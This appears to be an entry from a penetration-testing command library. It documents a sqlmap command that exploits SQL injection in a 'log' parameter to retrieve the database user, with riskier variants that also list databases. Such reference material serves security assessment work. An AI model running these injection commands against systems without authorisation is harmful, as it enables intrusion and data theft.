---
data: sqlmap -p log -r request-cz.txt --current-user --level=2 --risk=2
tags:
  - sql-injection
  - exploitation
type: command
output: 'Current database user: ''u_acronis@localhost'''
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.263Z'
id: ca84928c-f0fb-4daa-8b2a-ab0604e19434
verified: false
validated: true
submitted: true
---
# sqlmap-test-log-parameter

## Command

```bash
sqlmap -p log -r request-cz.txt --current-user --level=2 --risk=2
```

## Description

This command uses sqlmap to test for and exploit SQL injection in the 'log' parameter of a loaded HTTP request file, retrieving the current database user. It is used in web vulnerability assessments to confirm injectable parameters and extract basic database information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-p log` | Specifies the 'log' parameter as the injection target | Yes |
| `-r request-cz.txt` | Loads the HTTP request from the file request-cz.txt | Yes |
| `--current-user` | Retrieves the current database user executing the queries | Yes |
| `--level=2` | Sets testing level to 2, including more detection payloads | No |
| `--risk=2` | Sets risk level to 2, allowing riskier payloads that may impact the target | No |

## Examples

### Basic Usage

```bash
sqlmap -p log -r request-cz.txt --current-user
```

### Advanced Usage

```bash
sqlmap -p log -r request-cz.txt --current-user --level=3 --risk=3 --dbs
```
This extends to list all databases after user retrieval.

## Expected Output

The command outputs vulnerability detection messages, such as 'Parameter: log (POST) is vulnerable' followed by 'Current database user: u_acronis@localhost'. If unsuccessful, it reports no injection found.

## Related

- [[Related Procedure: Exploit-SQL-Injection-with-sqlmap]]
